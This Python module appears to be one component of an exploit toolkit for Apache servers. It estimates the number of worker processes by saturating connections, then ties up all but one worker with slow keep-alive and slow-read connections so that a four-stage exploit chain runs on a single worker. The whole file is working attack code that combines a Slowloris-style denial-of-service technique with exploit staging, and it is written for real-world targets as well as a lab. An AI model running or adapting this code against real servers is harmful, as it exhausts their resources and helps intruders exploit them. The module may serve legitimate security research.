"""Worker pinning by connection saturation.

For real-world Apache targets with MaxRequestWorkers > 1, the exploit chain
must run on a single worker (same PID) across all four stages. This module
saturates the worker pool with slow keep-alive connections, leaving exactly
one worker free for the exploit.

Strategy:
  1. Probe the target to estimate MaxRequestWorkers (send parallel connections,
     measure when new connections start queuing).
  2. Open (N-1) keep-alive connections that hold workers busy with slow reads.
  3. The exploit chain runs on the one remaining free worker.
  4. After exploitation, release the pinning connections.

For single-worker targets (the lab default), pinning is a no-op.
"""
from __future__ import annotations

import socket
import time
import threading
from dataclasses import dataclass


@dataclass
class PinState:
    sockets: list[socket.socket]
    worker_count: int
    pinned: bool


def estimate_workers(host: str, port: int, path: str = "/",
                     max_probe: int = 16, timeout: float = 5.0,
                     verbose: bool = True) -> int:
    """Estimate MaxRequestWorkers by saturating connections.

    Sends concurrent connections and measures when the target stops responding
    within the timeout. The last connection that got a response indicates
    the approximate worker count.
    """
    sockets = []
    responding = 0

    try:
        for i in range(1, max_probe + 1):
            try:
                s = socket.create_connection((host, port), timeout=timeout)
                s.settimeout(timeout)
                # Send a slow request (partial header)
                req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"X-Probe: {'A' * 1000}\r\n"
                ).encode()
                s.sendall(req)
                sockets.append(s)
                time.sleep(0.1)

                # Try a quick test connection
                test = socket.create_connection((host, port), timeout=2.0)
                test.settimeout(2.0)
                test.sendall(f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n".encode())
                resp = test.recv(256)
                test.close()

                if resp:
                    responding = i
                else:
                    break
            except (OSError, TimeoutError):
                break
    finally:
        # Clean up probe sockets
        for s in sockets:
            try:
                s.close()
            except OSError:
                pass

    result = max(1, responding)
    if verbose:
        print(f"  [pin] estimated MaxRequestWorkers: {result}")
    return result


def _hold_worker(host: str, port: int, path: str, duration: float,
                 result_list: list, idx: int):
    """Thread target: hold a worker busy with a slow-read connection."""
    try:
        s = socket.create_connection((host, port), timeout=duration + 10)
        s.settimeout(duration + 10)
        # Send a complete request but read the response very slowly
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode()
        s.sendall(req)
        result_list[idx] = s

        # Slow-read: consume response one byte at a time
        end = time.monotonic() + duration
        while time.monotonic() < end:
            try:
                s.recv(1)
                time.sleep(0.5)
            except (OSError, TimeoutError):
                break
    except OSError:
        pass


def pin_workers(host: str, port: int, path: str = "/",
                worker_count: int = 0, hold_duration: float = 120.0,
                verbose: bool = True) -> PinState:
    """Pin all but one worker with slow keep-alive connections.

    If worker_count=0, estimates it automatically. For single-worker
    targets, returns immediately with pinned=False (no pinning needed).

    Returns a PinState that must be released with release_pin() after
    the exploit chain completes.
    """
    if worker_count == 0:
        worker_count = estimate_workers(host, port, path, verbose=verbose)

    if worker_count <= 1:
        if verbose:
            print("  [pin] single worker, no pinning needed")
        return PinState(sockets=[], worker_count=worker_count, pinned=False)

    pin_count = worker_count - 1
    if verbose:
        print(f"  [pin] saturating {pin_count} of {worker_count} workers")

    sockets = [None] * pin_count
    threads = []
    for i in range(pin_count):
        t = threading.Thread(target=_hold_worker,
                             args=(host, port, path, hold_duration, sockets, i),
                             daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.1)

    # Wait for connections to establish
    time.sleep(1.0)

    active = sum(1 for s in sockets if s is not None)
    if verbose:
        print(f"  [pin] {active}/{pin_count} workers pinned")

    return PinState(
        sockets=[s for s in sockets if s is not None],
        worker_count=worker_count,
        pinned=active > 0,
    )


def release_pin(state: PinState, verbose: bool = True):
    """Release all pinning connections."""
    for s in state.sockets:
        try:
            s.close()
        except OSError:
            pass
    if verbose and state.pinned:
        print(f"  [pin] released {len(state.sockets)} pinning connections")
    state.sockets.clear()
    state.pinned = False
